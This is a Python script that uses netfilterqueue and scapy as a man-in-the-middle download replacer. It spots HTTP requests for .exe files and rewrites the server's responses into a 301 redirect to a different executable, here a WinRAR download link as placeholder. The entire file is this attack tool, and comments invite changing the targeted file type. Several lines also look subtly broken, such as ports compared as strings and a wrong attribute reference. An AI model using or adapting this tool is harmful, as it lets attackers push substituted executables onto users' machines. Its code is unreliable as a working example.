#!/usr/bin/env python3
import netfilterqueue
import scapy.all as scapy

ack_list = []


# processing packet for further changes, like now we are redirecting to another IP
def process_packet(packet):
    # loading  packet with scapy
    scapy_packet = scapy.IP(packet.get_payload())

    # check scapy packet if it has dns response
    if scapy_packet.haslayer(scapy.Raw):
        print(scapy_packet.show())
        # checking if it is HTTP request by destination port (dport)
        if scapy_packet[scapy.TCP].dport == '80':
            print("HTTP Request")

            # checking request if contain any excutable file requested to download
            # you can change the type of file as u want like .pdf
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe request")
                ack_list.append(scapy_packet[scapy.TCP].ack)
        elif scapy_packet[scapy.TCP].sport == '80':
            if scapy_packet[scapy_packet.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy_packet.TCP].seq)
                print("[+] Replacing file")
                scapy_packet[scapy.Raw].load="HTTP/1.1 301 Moved Permanently\nLocation: https://www.win-rar.com/predownload.html?spV=true&subD=true&f=winrar-x64-590.exe \n\n"
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(bytes(scapy_packet))


    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

# the packet known it's response between large traffic through the
# seq field in the TCP section
# EXAMPLE so the request has ACK=X3X3
# the response will had seq=X3X3
